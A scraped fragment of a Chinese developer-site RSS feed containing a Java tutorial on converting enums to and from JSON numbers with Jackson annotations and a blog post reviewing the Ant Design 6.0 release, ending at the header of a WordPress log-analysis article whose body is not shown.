pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前后端交互：如何优雅处理 Java 枚举与 JSON 数字的自动转换？</h2>
<p>在 Java 后端开发中，我们经常面临一个“数据格式不匹配”的通用问题：</p>
<ul>
<li><strong>数据库/前端</strong>：倾向于使用 <code>int</code>（如 1, 0）或 <code>String</code> 类型的状态码，因为它们传输快、存储小。</li>
<li><strong>后端代码</strong>：倾向于使用 <code>Enum</code>（枚举），因为枚举具备强类型约束，能避免“魔法数字”（Magic Number），提高代码可读性。</li>
</ul>
<p>如果直接返回枚举，默认会输出枚举的英文名称（如 <code>"ENABLE"</code>）；如果前端传数字 <code>1</code>，后端默认又无法自动转成枚举对象。</p>
<p>本文将介绍如何利用 Jackson（Spring Boot 默认的 JSON 框架）的两个核心注解 <code>@JsonValue</code> 和 <code>@JsonCreator</code>，实现<strong>枚举对象</strong>与<strong>JSON数值</strong>的无缝双向转换。</p>
<h3 data-id="heading-1">1. 场景复现：最简状态枚举</h3>
<p>我们以最基础的“通用状态”为例。假设我们定义了一个包含 <code>code</code> 属性的枚举：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.enums;

<span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonCreator;
<span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonValue;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CommonStatus</span> {
    
    DISABLE(<span class="hljs-number">0</span>, <span class="hljs-string">"禁用"</span>),
    ENABLE(<span class="hljs-number">1</span>, <span class="hljs-string">"启用"</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;

    CommonStatus(<span class="hljs-type">int</span> code, String desc) {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.desc = desc;
    }

    <span class="hljs-comment">// ... 下面是核心代码 ...</span>
}
</code></pre>
<h3 data-id="heading-2">2. 知识点详解</h3>
<h4 data-id="heading-3">2.1 序列化难题：如何让 Enum 变成 int？</h4>
<p><strong>问题</strong>：默认情况下，<code>CommonStatus.ENABLE</code> 序列化成 JSON 是 <code>"ENABLE"</code>。但前端往往需要数字 <code>1</code>。</p>
<p><strong>解决方案</strong>：使用 <strong><code>@JsonValue</code></strong>。</p>
<p><strong>原理</strong>：该注解标记的方法，其返回值将作为整个对象序列化后的结果。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">/**
     * 序列化 (Java -&gt; JSON)
     * 标记此方法后，Jackson 会将枚举序列化为 code 的值 (0 或 1)
     * 而不是枚举的名字 ("DISABLE" 或 "ENABLE")
     */</span>
    <span class="hljs-meta">@JsonValue</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> code;
    }
</code></pre>
<h4 data-id="heading-4">2.2 反序列化难题：如何让 int/String 变成 Enum？</h4>
<p><strong>问题</strong>：前端传 JSON <code>{"status": 1}</code> 或 <code>{"status": "1"}</code>。Jackson 默认是按照枚举的“名字”去匹配的，找不到名字叫 <code>"1"</code> 的枚举项，就会报错。</p>
<p><strong>解决方案</strong>：使用 <strong><code>@JsonCreator</code></strong>。</p>
<p><strong>原理</strong>：该注解标记的<strong>静态方法</strong>（Static Method）将作为对象的“构造工厂”。Jackson 会把 JSON 中的值传给这个方法，由开发者自定义逻辑返回对应的枚举对象。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">/**
     * 反序列化 (JSON -&gt; Java)
     * 静态工厂方法：自定义解析逻辑
     * 
     * 技巧：参数使用 String 类型，可以同时兼容前端传 Number(1) 和 String("1")
     */</span>
    <span class="hljs-meta">@JsonCreator</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CommonStatus <span class="hljs-title function_">fromCode</span><span class="hljs-params">(String value)</span> {
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span> || value.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 将输入值转为 int</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">targetCode</span> <span class="hljs-operator">=</span> Integer.parseInt(value);

            <span class="hljs-comment">// 2. 遍历枚举找到匹配的 code</span>
            <span class="hljs-keyword">for</span> (CommonStatus status : CommonStatus.values()) {
                <span class="hljs-keyword">if</span> (status.code == targetCode) {
                    <span class="hljs-keyword">return</span> status;
                }
            }
        } <span class="hljs-keyword">catch</span> (NumberFormatException e) {
            <span class="hljs-comment">// 非数字字符串处理</span>
        }

        <span class="hljs-comment">// 3. 找不到匹配项，抛出异常提示参数错误</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid status code: "</span> + value);
    }
</code></pre>
<h3 data-id="heading-5">3. 为什么这么做？（总结）</h3>
<p>通过这两个注解的组合，我们达成了以下效果：</p>
<ol>
<li><strong>对外（前端/数据库）</strong>：接口表现为简单的<strong>数字</strong>（Integer），符合通用的接口规范，传输效率高。</li>
<li><strong>对内（Java逻辑）</strong>：代码中完全使用<strong>枚举对象</strong>，享受强类型检查、switch-case 支持和方法封装的优势。</li>
<li><strong>鲁棒性</strong>：在 <code>fromCode</code> 方法中，我们兼容了字符串和数字的输入，极大地提高了接口的容错能力。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉 Ant Design 6.0 来了！这一次它终于想通了什么？]]></title>    <link>https://juejin.cn/post/7575810396202287138</link>    <guid>https://juejin.cn/post/7575810396202287138</guid>    <pubDate>2025-11-24T06:58:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575810396202287138" data-draft-id="7576077034745511988" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉 Ant Design 6.0 来了！这一次它终于想通了什么？"/> <meta itemprop="keywords" content="前端,JavaScript,Ant Design"/> <meta itemprop="datePublished" content="2025-11-24T06:58:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉 Ant Design 6.0 来了！这一次它终于想通了什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:58:32.000Z" title="Mon Nov 24 2025 06:58:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a241907c9093495da4afafdc406e0800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=RUCRowG2xt3nYvPykd1H740vSr0%3D" alt="image.png" loading="lazy"/></p>
<p>大家好😁。</p>
<p>还记得我之前那篇吐槽《<a href="https://juejin.cn/post/7571176484515659828" target="_blank" title="https://juejin.cn/post/7571176484515659828">当 Ant Design 成了你最大的技术债</a>》的文章吗😂？在那篇文章里，我痛斥了 Antd 的黑盒样式、难以覆盖的 <code>!important</code> 地狱，以及臃肿的 CSS-in-JS 运行时性能。</p>
<p>当时有很多朋友在评论区说：<strong>国内做 B 端，离不开它</strong>。</p>
<p>前天，Ant Design 6.0 正式发布了。带着审视（甚至是一点点找茬🤔）的心态，我仔细翻阅了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fant-design%2Freleases%2Ftag%2F6.0.0" target="_blank" title="https://github.com/ant-design/ant-design/releases/tag/6.0.0" ref="nofollow noopener noreferrer">Release Note</a> 和源码。</p>
<p>看完之后，我沉默了片刻，然后想说一句：
<strong>这一次，Ant Design 好像真的听懂了我们的骂声。它正在试图撕掉笨重的标签，向现代前端开发范式（Tailwind、Headless）发起一次自我更新。</strong></p>
<p>今天，我就以一个老用户的视角，来聊聊 Antd 6.0 到底改了什么，以及作为技术组长，我怎么看待这次升级🤷‍♂️。</p>
<hr/>
<h4 data-id="heading-0"><strong>告别运行时，拥抱 CSS Variables</strong></h4>
<p>在 v5 版本，Antd 引入了 CSS-in-JS。虽然它解决了按需加载的问题，但带来的运行时性能损耗和样式插入延迟，一直是性能敏感型项目的噩梦😭。</p>
<p><strong>v6 做了一个极其正确的决定：默认采用纯 CSS Variables模式，并且支持零运行时（Zero Runtime）。</strong></p>
<p>这意味着什么？</p>
<p><strong>性能大翻身</strong>：浏览器原生支持 CSS 变量，不再需要 JS 去计算和插入样式。根据官方的对比图，Zero Runtime 模式下的性能表现是最佳的。这也意味着，我们那臃肿的 JS Bundle 终于可以瘦身了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29f016620eb4474a83bc8868f28ded5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=CpiJt0i3u28c%2BzNqvx1KO%2FjIyN8%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc3cfe814bea47cabfc37b3d8f2e46ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=nbMT0mGRZ66GBi%2BVFMMYXvGqi%2Fw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>主题切换秒变</strong>：以前切换暗色模式，可能需要 JS 重新计算一堆 Token。现在？只需要改变根节点的几个 CSS 变量值，浏览器瞬间完成渲染。</p>
<p><strong>拥抱 React 19</strong>：这次升级开启了 React Compiler 支持，并且彻底移除了对 React 16/17 的兼容代码，轻装上阵。</p>
<p>这才是 2025 年组件库该有的样子。CSS 的事情，就该让 CSS 去做，JS 别管太宽🤔。</p>
<hr/>
<h4 data-id="heading-1"><strong>全量组件语义化</strong></h4>
<p>这是我最兴奋的一点😁。</p>
<p>以前我们想改一个 <code>Modal</code> 的样式，得去浏览器里扒 <code>ant-modal-content</code>、<code>ant-modal-header</code> 这种类名，然后写一堆高权重的 CSS 去覆盖。</p>
<p><strong>v6 完成了所有组件的 DOM 语义化改造。</strong></p>
<p>它引入了 <code>classNames</code> 和 <code>styles</code> 属性（这就很有 Headless UI 的味道了🤔），允许你精准地把样式注入到组件的内部结构中。</p>
<p>比如，你想做一个俏皮风格的按钮，或者一个极客风的卡片，你不再需要写恶心的 CSS Selector，而是可以直接这样写：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 简直是 Tailwind 玩家的福音</span>
&lt;<span class="hljs-title class_">Button</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">'rounded-tr-xl rounded-bl-xl'</span>, <span class="hljs-comment">// 直接写 Tailwind 类名！</span>
    <span class="hljs-attr">icon</span>: <span class="hljs-string">'rotate-30'</span>,
  }}
  icon={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmileOutlined</span> /&gt;</span></span>}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span>
&lt;/<span class="hljs-title class_">Button</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa06de73e6ea4d1a8abef923f5e9412b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=230ixSNWltPab1eeN91okftYnJM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>极客风卡片样式和效果</strong></p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">Card</span>
  title=<span class="hljs-string">"Hello World"</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">"bg-green-300/10 text-green-500 border-green-500 rounded-none [box-shadow:0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">header</span>: <span class="hljs-string">"rounded-none border-green-500 [box-shadow:inset_0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">title</span>:
      <span class="hljs-string">"text-green-500 [text-shadow:0_0_12px_theme(colors.green.400)] overflow-visible"</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-string">"rounded-none [text-shadow:0_0_8px_theme(colors.green.400)] [box-shadow:inset_0_0_12px_theme(colors.green.500)]"</span>
  }}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span> loves you!~ (=^・ω・^)
&lt;/<span class="hljs-title class_">Card</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/463ae39771804f5ab689be14dfe43544~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=hy%2FwMBbMaz%2BHplPmQ%2FsNMcDk860%3D" alt="image.png" loading="lazy"/></p>
<p>Antd 终于意识到，它不能只做写死的积木，它得提供接口。这对于追求 UI 个性化的团队来说，绝对是史诗级利好👍👍👍。</p>
<hr/>
<h4 data-id="heading-2"><strong>IE 走好，不送</strong></h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a1d7a8f2507419aba4e3ce82d4d9b87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=jUyioIEKaRDBoOjEoPkgbUUXY%2Bs%3D" alt="Suggestion.gif" loading="lazy"/></p>
<p>Antd 6.0 做了一个非常硬气的决定：<strong>彻底移除对 IE 的支持。</strong></p>
<p>同时，React 的最低版本要求提升到了 <strong>React 18!</strong>。</p>
<p>这可能对一些维护古董项目的团队是坏消息，但对于整个前端生态来说，这是大快人心的。我们终于不需要为了那 1% 的 IE 用户，去背负沉重的 polyfill 和 hack 代码了。</p>
<hr/>
<h4 data-id="heading-3"><strong>Ant Design X 2.0</strong></h4>
<p>除了一些基础库的升级，这次还有一个重磅消息：<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fx%2Fissues%2F1358" target="_blank" title="https://github.com/ant-design/x/issues/1358" ref="nofollow noopener noreferrer">Ant Design X 2.0 同步发布</a></strong>。</p>
<p>现在哪个 B 端产品不加点 AI 功能？Chat 界面、流式输出、提示词输入... 这些东西要是自己从头写，非常费劲。</p>
<p>Ant Design X 就是专门解决这个问题的。它不仅仅是 UI，更包含了一套面向 AI 场景的交互逻辑。</p>
<p>前端的战场正在从 CRUD 系统转向 AI 交互界面。Antd 这一步棋，走得很稳👍。</p>
<hr/>
<h4 data-id="heading-4"><strong>升级建议：要不要冲？🤔</strong></h4>
<p>作为技术组长，我不建议盲目升级，但我建议你<strong>认真评估</strong>。</p>
<p><strong>如果你是 v5 用户：直接冲！</strong> 官方承诺是平滑迁移，无需 codemod，直接升级即可。你能立刻获得性能提升和 CSS 变量的红利。</p>
<p><strong>如果你是 v4 用户</strong>：v6 移除了 v4 的废弃 API。这依然是一次断崖式的升级，成本较高。建议先升级到 v5 过渡，或者在新项目中直接使用 v6。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47d5c321da9f4ac49979ef2508da2ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572311&amp;x-signature=fNf5VgbdCG8GBjyLtwhK%2BT7cXC4%3D" alt="image.png" loading="lazy"/></p>
<p><strong>如果你还在维护 IE 项目</strong>：留在 v5 吧，v5 进入了 1 年的维护周期，足够你养老了😖。</p>
<hr/>
<p>Ant Design 已经 10 岁了🫅。</p>
<p>在一个技术栈迭代快如闪电的时代，一个库能活 10 年，并且还能在第 10 年做出 v6 这样推倒重来式的革新，是值得赞扬的👍👍👍。</p>
<p>虽然我依然推崇 Tailwind + Headless UI 的灵活性，但 Ant Design 6.0 让我看到了重型组件库的另一种可能性——<strong>它在努力变轻，努力变开放，努力适应 AI 时代。</strong></p>
<p>也许，它不再是我最大的技术债，而重新变成了那个可以信赖的老伙计😁。</p>
<p><strong>你们怎么看这次 Antd 6.0 的升级？</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WordPress保卫战：用Python分析日志并封禁恶意爬虫]]></title>    <link>https://juejin.cn/post/7575742632334377010</link>    <guid>https://juejin.cn/post/7575742632334377010</guid>    <pubDate>2025-11-24T06:29:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575742632334377010" data-draft-id="7575718948299046963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WordPress保卫战：用Python分析日志并封禁恶意爬虫"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-24T06:29:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/3432034642699739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WordPress保卫战：用Python分析日志并封禁恶意爬虫
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3432034642699739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:29:38.000Z" title="Mon Nov 24 2025 06:29:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
